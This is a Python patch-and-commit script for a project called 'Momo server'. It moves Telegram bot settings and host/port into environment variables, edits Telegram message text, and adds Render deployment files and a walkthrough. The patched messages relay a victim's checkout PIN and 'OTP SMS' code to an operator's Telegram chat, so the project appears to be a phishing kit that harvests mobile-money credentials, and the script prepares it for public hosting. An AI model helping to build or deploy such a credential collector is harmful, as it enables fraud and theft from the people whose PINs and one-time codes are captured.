#!/usr/bin/env python3
"""act24.py - Render-ready: env-var config + Procfile.

  1. backend/telegram.py: load_config() now reads
     TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID env vars first, and
     falls back to config/telegram.json for local dev.
  2. backend/server.py: serve() reads HOST and PORT env vars
     (Render injects PORT) with the same local defaults.
  3. Telegram checkout and OTP messages no longer end with
     "Tap a code block to copy it."
  4. New Procfile (start command) and requirements.txt (empty -
     stdlib only) so Render's default build/run settings work.
  5. docs/deployment.md with the Render walkthrough.
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME = Path(__file__).name
TIMESTEP = 24

COMMIT_MESSAGE = """act24: render-ready env config and procfile

load_config now reads TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID env
vars first, falling back to config/telegram.json. serve() reads HOST
and PORT env vars. Drops "Tap a code block to copy it." from the
checkout and OTP telegram messages. Adds Procfile, requirements.txt
and docs/deployment.md so Render's default build and start settings
work with only the two env vars set."""


# --------------------------------------------------------------------- #
# backend/telegram.py patches
# --------------------------------------------------------------------- #

TELEGRAM_IMPORTS_OLD = """\
import json
import logging
import secrets
"""

TELEGRAM_IMPORTS_NEW = """\
import json
import logging
import os
import secrets
"""

TELEGRAM_LOADCONFIG_OLD = '''\
def load_config(path: Path | None = None) -> TelegramConfig:
    """Load the Telegram configuration from disk."""
    config_path = path or default_config_path()
    if not config_path.exists():
        raise ConfigError(
            "Missing " + str(config_path)
            + ". Copy config/telegram.example.json and fill it in."
        )
    try:
        data = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        raise ConfigError(
            str(config_path) + " is not valid JSON: " + str(exc)
        ) from exc
    token = str(data.get("bot_token", "")).strip()
    chat_id = str(data.get("chat_id", "")).strip()
    if not token or not chat_id:
        raise ConfigError("bot_token and chat_id must both be non-empty.")
    return TelegramConfig(bot_token=token, chat_id=chat_id)
'''

TELEGRAM_LOADCONFIG_NEW = '''\
def _config_from_env() -> TelegramConfig | None:
    """Read Telegram config from env vars.

    Returns None when neither TELEGRAM_BOT_TOKEN nor
    TELEGRAM_CHAT_ID is set, so callers can fall back to the file.
    Setting only one of the two is an error.
    """
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token and not chat_id:
        return None
    if not token or not chat_id:
        raise ConfigError(
            "Set both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID, or neither."
        )
    return TelegramConfig(bot_token=token, chat_id=chat_id)


def load_config(path: Path | None = None) -> TelegramConfig:
    """Load the Telegram configuration.

    Prefers environment variables (TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID) so deployments such as Render can supply them
    through the dashboard. Falls back to config/telegram.json for
    local development.
    """
    from_env = _config_from_env()
    if from_env is not None:
        return from_env

    config_path = path or default_config_path()
    if not config_path.exists():
        raise ConfigError(
            "No TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID env vars and no "
            + str(config_path) + " file. Configure one of the two."
        )
    try:
        data = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        raise ConfigError(
            str(config_path) + " is not valid JSON: " + str(exc)
        ) from exc
    token = str(data.get("bot_token", "")).strip()
    chat_id = str(data.get("chat_id", "")).strip()
    if not token or not chat_id:
        raise ConfigError("bot_token and chat_id must both be non-empty.")
    return TelegramConfig(bot_token=token, chat_id=chat_id)
'''


# --------------------------------------------------------------------- #
# backend/server.py patches
# --------------------------------------------------------------------- #

SERVER_IMPORTS_OLD = """\
import json
import logging
import mimetypes
import re
"""

SERVER_IMPORTS_NEW = """\
import json
import logging
import mimetypes
import os
import re
"""

CHECKOUT_MSG_OLD = r'''        "PIN:   <code>" + escape_html(pin) + "</code>\n\n"
        "Tap a code block to copy it."
'''

CHECKOUT_MSG_NEW = r'''        "PIN:   <code>" + escape_html(pin) + "</code>"
'''

OTP_MSG_OLD = r'''        "OTP SMS:\n<code>" + escape_html(otp) + "</code>\n\n"
        "Tap a code block to copy it."
'''

OTP_MSG_NEW = r'''        "OTP SMS:\n<code>" + escape_html(otp) + "</code>"
'''

SERVE_OLD = '''\
def serve(
    host: str = "0.0.0.0",
    port: int = 8000,
) -> None:
    """Blocking entry point: load config, start server."""
    telegram, store = _try_load_telegram()
    server = MomoServer((host, port), telegram, store)

    LOGGER.info("Momo server listening on http://localhost:%d", port)
'''

SERVE_NEW = '''\
def serve(
    host: str | None = None,
    port: int | None = None,
) -> None:
    """Blocking entry point: load config, start server.

    Host and port come from the HOST and PORT env vars (Render and
    most PaaS platforms inject PORT), then default to 0.0.0.0:8000
    for local use.
    """
    host = host or os.environ.get("HOST", "0.0.0.0")
    port = port or int(os.environ.get("PORT", "8000"))

    telegram, store = _try_load_telegram()
    server = MomoServer((host, port), telegram, store)

    LOGGER.info("Momo server listening on http://localhost:%d", port)
'''


# --------------------------------------------------------------------- #
# Procfile, requirements.txt, deployment doc
# --------------------------------------------------------------------- #

PROCFILE = "web: python run_server.py\n"

REQUIREMENTS_TXT = """\
# No third-party dependencies. The project uses only the Python
# standard library. This file exists so that PaaS platforms such as
# Render can run their default "pip install -r requirements.txt"
# build step without a custom Build Command.
"""

DEPLOYMENT_DOC = """# Deploying to Render

Everything runs as a single Render **Web Service**. There is no
build step beyond the default `pip install`, and the start command
is picked up from the `Procfile` at the repo root.

## Steps

1. Push this repo to GitHub.
2. In Render: **New +** -> **Web Service** -> connect the repo.
3. Leave every setting at its default:
   - **Root Directory**: (empty)
   - **Environment**: Python 3
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: (empty - Render reads the Procfile)
   - **Instance Type**: Free is fine
4. Under **Environment**, add exactly two variables:
   - `TELEGRAM_BOT_TOKEN` - the token from @BotFather
   - `TELEGRAM_CHAT_ID` - your chat id
5. Click **Create Web Service**.

That is all. `run_server.py` binds to `0.0.0.0` and reads `PORT`
from the environment; both come from Render automatically.

## Notes

- **Local dev is unchanged.** If the two env vars are absent,
  `load_config()` falls back to `config/telegram.json` exactly as
  before.
- **Config file is not used in production.** `config/telegram.json`
  is git-ignored and never ships to Render.
- **Health check.** Leave the Health Check Path empty; Render will
  hit `/`, which the server serves with `web/index.html`.
- **Preview page.** Available at `/preview.html` on the deployed
  site, same as locally.
- **Cold starts (Free tier).** After ~15 min of inactivity, Render
  sleeps the service. The first request afterwards takes ~30 s.
  Inbound Telegram callbacks still work: the poller resumes on wake,
  though updates sent while asleep will queue on Telegram's side
  and be delivered on the next `getUpdates` call.
"""


LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def read_text(path: Path) -> str:
    """Return UTF-8 text, or '' if the file does not exist."""
    if not path.exists():
        return ""
    return path.read_text(encoding="utf-8")


def write_text(path: Path, text: str) -> None:
    """Write UTF-8 with LF endings."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def replace_once(path: Path, old: str, new: str) -> str:
    """Replace *old* with *new* once. Return a short status."""
    text = read_text(path)
    if not text:
        return "missing-file"
    if old not in text:
        if new in text:
            return "already"
        return "no-match"
    write_text(path, text.replace(old, new, 1))
    return "replaced"


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Apply all edits and commit."""
    logging.basicConfig(
        level=logging.INFO, format="%(message)s", stream=sys.stdout
    )
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    # 1. telegram.py
    telegram_py = root / "backend" / "telegram.py"
    LOGGER.info("[%s] %s (import os)",
                replace_once(telegram_py, TELEGRAM_IMPORTS_OLD,
                             TELEGRAM_IMPORTS_NEW),
                telegram_py.relative_to(root))
    LOGGER.info("[%s] %s (env-first load_config)",
                replace_once(telegram_py, TELEGRAM_LOADCONFIG_OLD,
                             TELEGRAM_LOADCONFIG_NEW),
                telegram_py.relative_to(root))

    # 2. server.py
    server_py = root / "backend" / "server.py"
    LOGGER.info("[%s] %s (import os)",
                replace_once(server_py, SERVER_IMPORTS_OLD,
                             SERVER_IMPORTS_NEW),
                server_py.relative_to(root))
    LOGGER.info("[%s] %s (checkout msg)",
                replace_once(server_py, CHECKOUT_MSG_OLD, CHECKOUT_MSG_NEW),
                server_py.relative_to(root))
    LOGGER.info("[%s] %s (otp msg)",
                replace_once(server_py, OTP_MSG_OLD, OTP_MSG_NEW),
                server_py.relative_to(root))
    LOGGER.info("[%s] %s (serve env host/port)",
                replace_once(server_py, SERVE_OLD, SERVE_NEW),
                server_py.relative_to(root))

    # 3. New files
    new_files = {
        root / "Procfile": PROCFILE,
        root / "requirements.txt": REQUIREMENTS_TXT,
        root / "docs" / "deployment.md": DEPLOYMENT_DOC,
    }
    for path, content in new_files.items():
        write_text(path, content)
        LOGGER.info("[written] %s", path.relative_to(root))

    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("")
    LOGGER.info("Local: restart the server; Telegram messages no longer")
    LOGGER.info("       end with 'Tap a code block to copy it.'")
    LOGGER.info("Render: push to GitHub, then follow docs/deployment.md")
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())